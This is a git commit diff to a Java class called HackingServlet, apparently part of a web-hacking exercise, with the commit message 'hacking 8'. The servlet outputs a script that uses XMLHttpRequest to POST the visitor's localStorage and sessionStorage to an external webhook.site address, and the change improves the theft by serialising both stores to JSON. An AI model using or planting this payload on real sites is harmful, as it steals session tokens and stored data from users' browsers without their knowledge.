920599ada7643d24aec3e74fb87dbb0b20614c19
Aleksander Tudruj <aleksanderwt@gmail.com>
2022-10-24 19:42:11 +0200

    hacking 8

--- src/main/java/com/example/model/HackingServlet.java
+++ src/main/java/com/example/model/HackingServlet.java
@@ -15,7 +15,7 @@ public class HackingServlet extends KavaServlet {
                 <script>
                 var xhr = new XMLHttpRequest();
                 xhr.open("POST", 'https://webhook.site/13e6f66b-f6dd-496d-a3d9-650a05798885', true);
-                xhr.send(localStorage + ' ' + sessionStorage);
+                xhr.send(JSON.stringify(localStorage) + ' ' + JSON.stringify(sessionStorage));
                 </script>""");
     }
 
